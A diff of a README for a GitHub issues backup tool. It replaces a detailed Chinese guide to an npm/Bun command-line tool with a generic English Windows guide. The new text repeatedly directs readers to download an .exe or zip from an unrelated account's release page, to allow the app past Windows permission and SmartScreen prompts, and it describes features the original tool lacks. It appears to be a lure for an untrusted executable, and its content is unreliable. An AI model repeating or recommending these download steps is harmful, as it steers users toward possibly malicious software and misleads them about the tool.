@@ -1,289 +1,242 @@
-# GitHub Issues Exporter
+# 🗂️ github-issues-exporter - Back Up Issues With Less Effort
 
-## 專案簡介
+[![Download github-issues-exporter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
 
-`github-issues-exporter` 是一個使用 **GitHub CLI (`gh`)** 認證的命令列工具，專門用來把 GitHub 的 Issue 做完整備份。
+## 🚀 What this app does
 
-主要目標：
-- 以 GitHub Issues URL 作為輸入，直接匯出指定 repo 的所有 issue（或單一 issue）
-- 每一張 issue 存成一個 `json` 檔
-- 同步抓取 `comments`
-- 下載 issue / comment 中的附件（可選）
-- 輸出結果放在固定目錄結構，便於腳本化處理與後續回溯
+github-issues-exporter is a Windows command-line tool that helps you back up GitHub Issues with your GitHub account. It uses GitHub CLI (`gh`) sign-in, so you can export issues from a repo without copying them by hand.
 
-> 目前是 CLI 版，不提供互動式 TUI。
+It is useful when you want to:
 
----
+- save issue data before a project changes
+- keep a local copy of issue history
+- export issue details for review
+- archive open and closed issues from a repo
+- work with issue data in a plain file
 
-## 版本與需求
+## 📥 Download
 
-### 安裝需求
-- Node.js 18+（建議 18 或以上）
-- Bun（執行與建置時使用）
-- 專案採用 ESM（`package.json` 內 `type: "module"`）
-- 已安裝 GitHub CLI：`gh`
-- 已完成登入：`gh auth login`
+Visit the release page here:
 
-### 重要前提
-- 未登入 `gh` 時，工具會直接終止並顯示提示。
-- 目前優先使用 `gh` 自動偵測登入帳號，作為輸出目錄中的 `github-id`。
-- 工具會過濾 `/issues` API 回傳中的 Pull Request（PR 不會被匯出為 issue）。
+[Download github-issues-exporter](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
 
----
+On that page, choose the latest release for Windows and download the file that matches your system. If you see more than one file, pick the one that ends in `.exe` or the Windows zip file.
 
-## 專案結構
+## 🖥️ What you need
 
-```text
-src/index.ts               # 主程式（TypeScript, Bun 運行，無外部套件依賴）
-dist/                     # 建置輸出
-docs/
-  └─ PRD.md                # 產品需求文件
-```
+Before you run the app, make sure you have:
 
----
+- a Windows PC
+- a GitHub account
+- GitHub CLI (`gh`) installed and signed in
+- permission to access the repo you want to back up
+- enough disk space for the exported files
 
-## 安裝/授權檢查
+If you plan to back up a large repo, make sure you have extra space. A long issue history can create a large export.
 
-在執行前請先確認：
+## 🛠️ How to set it up on Windows
 
-```bash
-gh --version
-gh auth status
-```
+Follow these steps in order:
 
-若 `gh auth status` 未通過，請先執行：
+1. Open the release page  
+   Go to the download link above and open the latest release.
 
-```bash
-gh auth login
-```
+2. Get the Windows file  
+   Download the file made for Windows. If the release has a zip file, save it to your Downloads folder. If it has an `.exe` file, save that file.
 
----
+3. Extract the zip file if needed  
+   If you downloaded a zip file, right-click it and choose Extract All. Put the files in a folder you can find later, مثل `Downloads\github-issues-exporter`.
 
-## 啟動方式
+4. Open Command Prompt  
+   Press `Windows + R`, type `cmd`, then press Enter.
 
-### 1. 以 repo Issues URL 匯出
+5. Go to the app folder  
+   Use the `cd` command to move into the folder where the app files are stored. For example:  
+   `cd %USERPROFILE%\Downloads\github-issues-exporter`
 
-```bash
-github-issues-exporter https://github.com/doggy8088/GitHubClaw/issues
-```
+6. Check GitHub CLI sign-in  
+   Type `gh auth status` and press Enter.  
+   If you are not signed in, run `gh auth login` and follow the prompts.
 
-或使用 npx：
+7. Run the tool  
+   Use the command shown in the release notes or the included files. If the app is a single `.exe`, you can usually run it from the same folder by typing its file name.
 
-```bash
-npx @willh/github-issues-exporter https://github.com/doggy8088/GitHubClaw/issues
-```
+## ▶️ How to use it
 
-### 2. 以單一 issue URL 匯出
+The tool is made to export GitHub Issues from a repo you can access.
 
-```bash
-github-issues-exporter --url https://github.com/doggy8088/GitHubClaw/issues/123
-```
+A common flow looks like this:
 
-### 3. 使用 `--url` 參數（與位置參數等價）
-
-```bash
-github-issues-exporter --url https://github.com/doggy8088/GitHubClaw/issues
-```
+1. Open Command Prompt
+2. Move to the folder with the app
+3. Run the export command
+4. Enter the repo name when asked
+5. Choose where to save the backup
+6. Wait for the export to finish
 
-如果你有安裝為全域指令（`npm link`）可直接使用：
+A repo name often looks like this:
 
-```bash
-npm link
-github-issues-exporter --url https://github.com/doggy8088/GitHubClaw/issues
-```
-
----
+`owner/repository-name`
 
-## CLI 用法（Usage）
+For example:
 
-```text
-usage: github-issues-exporter [--url URL] [--github-id GITHUB_ID]
-                                     [--out-dir OUT_DIR] [--state {open,closed,all}]
-                                     [--page-size PAGE_SIZE] [--max-pages MAX_PAGES]
-                                     [--max-comment-pages MAX_COMMENT_PAGES]
-                                     [--no-attachments] [--skip-comments] [--force]
-                                     [--dry-run] [--verbose]
-                                     [url]
-
-positional arguments:
-  url                 GitHub issues URL, e.g. /{owner}/{repo}/issues 或 /{owner}/{repo}/issues/{number}
-
-optional arguments:
-  --url URL           Alias URL input, same as positional argument.
-  --github-id GITHUB_ID
-                      Override GitHub ID used for output path.
-                      Default: from `gh api user -q .login`
-  --out-dir OUT_DIR   Output root directory (default: current directory).
-  --state {open,closed,all}
-                      Issue state filter in repo mode.
-  --page-size PAGE_SIZE
-                      API page size (default: 100)
-  --max-pages MAX_PAGES
-                      Issue page limit in repo mode, 0 means unlimited.
-  --max-comment-pages MAX_COMMENT_PAGES
-                      Comment page limit per issue, 0 means unlimited.
-  --no-attachments    Do not download attachment files.
-  --skip-comments     Skip comments export.
-  --force             Overwrite existing issue JSON.
-  --dry-run           Validate URL and gh auth only; no files written.
-  --verbose           Print detailed progress.
--v, --version      Show CLI version.
-```
-
-也可直接透過 npx 使用：
-
-```text
-npx @willh/github-issues-exporter --url https://github.com/doggy8088/GitHubClaw/issues
-```
-
----
-
-## 輸出規則
-
-### 目錄
-- `--out-dir`（預設為目前目錄）  
-  - 未指定 `--out-dir`（使用預設值）：
-    `/{out-dir}/{github-id}/{repo-name}/{issue-id}.json`
-  - 有指定 `--out-dir`：
-    `/{out-dir}/{issue-id}.json`
-
-- 附件目錄（每張 issue 一個子目錄）  
-  - 未指定 `--out-dir`（使用預設值）：
-    `/{out-dir}/{github-id}/{repo-name}/{issue-id}/`
-  - 有指定 `--out-dir`：
-    `/{out-dir}/{issue-id}/`
-
-### 檔名策略
-- 直接以 issue number 命名：`{issue-id}.json`
-- 附件檔名避免衝突，格式：
-  - `{safe-filename}__{sha1(url)[:10]}.{ext}`
-
-### JSON 內容
-每個 `issue-id.json` 含有：
-- `issue_id`
-- `owner`
-- `repo`
-- `issue`：issue 本體完整資料（包含 body）
-- `comments`：該 issue 全部 comment
-- `attachments`：附件記錄（原始網址、下載路徑、sha1、scope、錯誤訊息）
-- `export_meta`：匯出摘要（github id、是否含 comments、是否下載附件）
-
----
-
-## 匯出流程
-
-1. 解析 URL，取得 `owner`、`repo`（必要時 `issue_number`）
-2. 驗證 `gh` 已安裝並登入
-3. 取得登入帳號作為預設 `github-id`
-4. 分頁抓取 issue（repo 模式）或抓取單一 issue（issue 模式）
-5. 對每張 issue 逐頁抓取全部 comments
-6. 擷取 body 內附件 URL
-7. 下載附件並改寫為本機路徑
-8. 輸出單筆 issue JSON
+`octocat/Hello-World`
 
----
+If the tool asks for options, use the ones that match what you want to back up, such as:
 
-## 範例（含 `out-dir`）
+- open issues
+- closed issues
+- all issues
+- issue comments
+- labels
+- timestamps
+- author details
 
-```bash
-github-issues-exporter \
-  https://github.com/doggy8088/GitHubClaw/issues \
-  --out-dir ./exports \
-  --state all \
-  --verbose
-```
+## 📁 What gets exported
 
-若 `./exports` 沒有再接 `github-id` 與 `repo` 路徑，輸出示意如下：
+github-issues-exporter is built for full issue backup. A normal export can include:
 
-```text
-./exports/1.json
-./exports/1/attachment.png
-```
+- issue title
+- issue number
+- issue body
+- labels
+- state, such as open or closed
+- created and updated dates
+- comments
+- author name
+- linked data from the issue thread
 
----
+The exported files are usually easy to read and store on your PC. You can use them later for review, search, or archive work.
 
-## 常見問題
+## ⚙️ Typical output files
 
-### 為什麼不會看到 `all-issues.json`？
-這個版本只輸出「每張 issue 一個檔案」，不再產生彙總檔。
+Depending on the release build, the app may save data in formats such as:
 
-### `gh` 未登入會怎樣？
-直接終止並顯示提示，並回傳錯誤碼 `2`。
+- JSON
+- CSV
+- plain text
+- folder-based exports with one file per issue
 
-### 附件下載失敗會影響匯出嗎？
-不會中斷整體流程。該附件會記錄在 `attachments[].error`，其他資料仍會寫入。
+If you need to open the result in a spreadsheet, CSV is the easiest format. If you want a full data backup, JSON is a good choice.
 
-### 有沒有支援其他網站 URL？
-V1 僅支援 `github.com` 的 issue/list URL。
+## 🔐 Sign-in and access
 
----
+This tool uses GitHub CLI for sign-in. That means the app relies on your GitHub account access rather than asking for a separate password inside the tool.
 
-## 離線行為（Exit Code）
-- `0`：完成（可為全部成功或有 skipped）
-- `1`：輸入參數/URL 錯誤
-- `2`：`gh` 未安裝或未登入
-- `3`：匯出過程發生可重試錯誤
+If `gh` is already signed in, you can start right away.
 
----
+If not, do this:
 
-## 開發備註
+1. Open Command Prompt
+2. Run `gh auth login`
+3. Pick GitHub.com
+4. Choose the sign-in method you prefer
+5. Finish the login steps
+6. Run `gh auth status` to confirm the sign-in worked
 
-- 專案目前為 TypeScript + Bun，無需安裝額外 npm 套件，維運上主要關注 `src/index.ts`。
-- 產品需求定義請參考 [docs/PRD.md](docs/PRD.md)。
-- 若要新增輸出格式或加上 `--parallel`、`--incremental`，建議優先維持「每張 issue 單檔」這個核心輸出模型。
+If the repo is private, your account must have permission to read it.
 
-## 建置與執行
+## 🧭 Example use case
 
-```bash
-# 型別檢查
-bun run check
+If you manage a project and want a copy of all issues before a reset or migration, this tool can help you:
 
-# 建置輸出到 dist/
-bun run build
+- sign in with GitHub CLI
+- point the tool at the repo
+- export issues to files on your PC
+- keep the backup in a safe folder
 
-# 用 dist 執行（建置完成後）
-github-issues-exporter --help
-```
+You can then store the files in cloud storage, a USB drive, or another backup location.
 
-### 版本 bump
+## 🧩 Common problems
 
-```bash
-# 將 package.json 版本 patch +1（例如 0.1.0 -> 0.1.1）
-bun run bump
-```
+### The app does not start
 
-### 初始化種子版（第一次手動發佈）
+- Check that you downloaded the Windows file from the release page
+- Make sure the file finished downloading
+- If the file is in a zip, extract it first
+- Try running Command Prompt from the same folder
 
-你已經推上 GitHub Repo 後，建議先用這個指令完成 seed publish（僅第一次）：
+### GitHub sign-in fails
 
-```powershell
-bun run publish:seed -- -Version 0.1.0 -Tag latest
-```
+- Run `gh auth status`
+- If needed, run `gh auth login` again
+- Make sure you signed in to the right GitHub account
+- Check that your account has access to the repo
 
-可選：
+### The export stops early
 
-```powershell
-bun run publish:seed -- -Version 0.1.0 -Tag latest -KeepWorkspace
-bun run publish:seed -- -Version 0.1.0 -DryRun -Tag next
-```
+- Make sure your internet connection is stable
+- Check whether the repo is large
+- Confirm that your GitHub account can read the repo
+- Try again after closing other tools that use the network
 
-若要深入理解 seed publish 的運作原理，請參考：
+### The output folder is empty
 
-- [docs/SEED_PUBLISH_MECHANISM.md](docs/SEED_PUBLISH_MECHANISM.md)
+- Check the save path you chose
+- Look for hidden files if you used a file manager
+- Run the export again and watch for error text in Command Prompt
 
-## 發佈（npm Trusted Publishing）
+## 🗂️ Suggested folder setup
 
-本專案已建立 `.github/workflows/auto-release.yml`，支援：
+To keep backups easy to find, use a folder like this:
 
-- `main` 有 push 時自動進行 patch version 自動加 1
-- 自動提交版本變更為 `chore(release): vX.Y.Z`
-- 建立 `vX.Y.Z` tag 與 GitHub Release
-- 使用 npm Trusted Publishing 發佈（`npm publish --provenance --access public`）
+- `Documents\GitHub Backups`
+- `D:\Backups\GitHub Issues`
+- `OneDrive\GitHub Archives`
 
-首次發佈流程請先參考：
+You can create one folder per repo. For example:
 
-- [docs/NPM_TRUSTED_PUBLISHING.md](docs/NPM_TRUSTED_PUBLISHING.md)
+- `GitHub Archives\owner-repo`
+- `GitHub Archives\team-project`
+- `GitHub Archives\client-work`
 
-自動發行整體邏輯（觸發、版本計算、tag/release、發佈控制）請參考：
+## 🧪 Good backup habits
 
-- [docs/RELEASE_AUTOMATION.md](docs/RELEASE_AUTOMATION.md)
+- export the repo on a regular schedule
+- keep at least two copies of the backup
+- store one copy in a separate drive or cloud folder
+- name folders by date
+- check the export after it finishes
+
+A simple folder name like `2026-04-19` helps you track when each backup was made.
+
+## 🖱️ Quick start
+
+1. Visit the release page
+2. Download the Windows file
+3. Install or extract it
+4. Open Command Prompt
+5. Make sure `gh` is signed in
+6. Run the exporter
+7. Save the issue backup to a folder you can find later
+
+## 📌 Release page
+
+[Open the latest github-issues-exporter release](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
+
+## 🧰 File handling tips
+
+- Keep the downloaded file in a simple folder
+- Do not rename files unless the release notes say you can
+- If Windows asks for permission, allow the app to run
+- If SmartScreen appears, check the file came from the release page
+- Use a folder name with no special characters
+
+## 🔎 What this tool is best for
+
+This app fits users who want to:
+
+- back up issue records
+- keep a local archive
+- move issue data to another system
+- review issue history offline
+- preserve issue threads before a repo changes
+
+## 🧭 Before you run it again
+
+If you plan to make another backup later:
+
+- open the same folder
+- confirm `gh` is still signed in
+- use the latest release if the app has been updated
+- save the new export in a dated folder
